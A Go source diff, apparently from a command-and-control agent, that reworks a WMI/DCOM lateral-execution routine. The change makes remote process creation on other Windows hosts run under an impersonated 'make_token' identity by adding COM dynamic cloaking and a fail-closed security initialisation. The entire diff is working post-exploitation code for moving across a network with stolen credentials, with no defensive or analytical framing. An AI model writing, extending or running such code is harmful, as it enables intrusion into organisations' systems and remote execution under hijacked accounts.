@@ -6,14 +6,14 @@ import (
 	"errors"
 	"fmt"
 	"runtime"
+	"sync"
 	"syscall"
 	"unsafe"
 )
 
 // Native WMI lateral execution: a COM/DCOM call chain replaces wmic.exe and
-// its PowerShell fallback. The lateral child process runs under the active
-// make_token identity, so the DCOM authentication uses those network
-// credentials; without a token it uses the agent's own identity.
+// its PowerShell fallback. The pinned worker impersonates the active make_token
+// identity; COM cloaking uses that thread token for outbound authentication.
 
 const (
 	coinitMultithreaded      = 0x0
@@ -24,13 +24,15 @@ const (
 	rpcCAuthnLevelDefault    = 0
 	rpcCAuthnLevelPktPrivacy = 6
 	rpcCImpLevelImpersonate  = 3
-	eoacNone                 = 0x0
+	eoacDynamicCloaking      = 0x40
 	vtBstr                   = 8
 	vtI4                     = 3
 	cimString                = 8
 )
 
 var (
+	wmiSecurityOnce       sync.Once
+	wmiSecurityErr        error
 	ole32                 = syscall.NewLazyDLL("ole32.dll")
 	oleaut32              = syscall.NewLazyDLL("oleaut32.dll")
 	procCoInitializeEx    = ole32.NewProc("CoInitializeEx")
@@ -41,6 +43,19 @@ var (
 	procSysAllocString    = oleaut32.NewProc("SysAllocString")
 	procSysFreeString     = oleaut32.NewProc("SysFreeString")
 )
+
+// initializeWMISecurity establishes process-wide thread-token cloaking once.
+// A prior incompatible initialization fails closed instead of using the process
+// identity for the initial remote connection.
+func initializeWMISecurity() error {
+	wmiSecurityOnce.Do(func() {
+		if hr, _, _ := procCoInitializeSec.Call(0, ^uintptr(0), 0, 0,
+			rpcCAuthnLevelDefault, rpcCImpLevelImpersonate, 0, eoacDynamicCloaking, 0); hr != 0 {
+			wmiSecurityErr = fmt.Errorf("CoInitializeSecurity with thread cloaking failed: 0x%08x", hr)
+		}
+	})
+	return wmiSecurityErr
+}
 
 type comGUID struct {
 	data1 uint32
@@ -142,9 +157,9 @@ func wmiCreateProcess(host, command string) error {
 		return fmt.Errorf("CoInitializeEx failed: 0x%08x", hr)
 	}
 	defer procCoUninitialize.Call()
-	// Process-wide default security; per-proxy blankets below override it.
-	procCoInitializeSec.Call(0, ^uintptr(0), 0, 0,
-		rpcCAuthnLevelDefault, rpcCImpLevelImpersonate, 0, eoacNone, 0)
+	if err := initializeWMISecurity(); err != nil {
+		return err
+	}
 	var locator uintptr
 	if hr, _, _ := procCoCreateInstance.Call(
 		uintptr(unsafe.Pointer(&clsidWbemLocator)), 0, clsctxInprocServer,
@@ -169,7 +184,7 @@ func wmiCreateProcess(host, command string) error {
 	defer comRelease(services)
 	if hr, _, _ := procCoSetProxyBlanket.Call(
 		services, authnSvc, rpcCAuthzNone, uintptr(unsafe.Pointer(serverPrincipal)),
-		rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, 0, eoacNone,
+		rpcCAuthnLevelPktPrivacy, rpcCImpLevelImpersonate, 0, eoacDynamicCloaking,
 	); hr != 0 {
 		return fmt.Errorf("CoSetProxyBlanket failed: 0x%08x", hr)
 	}
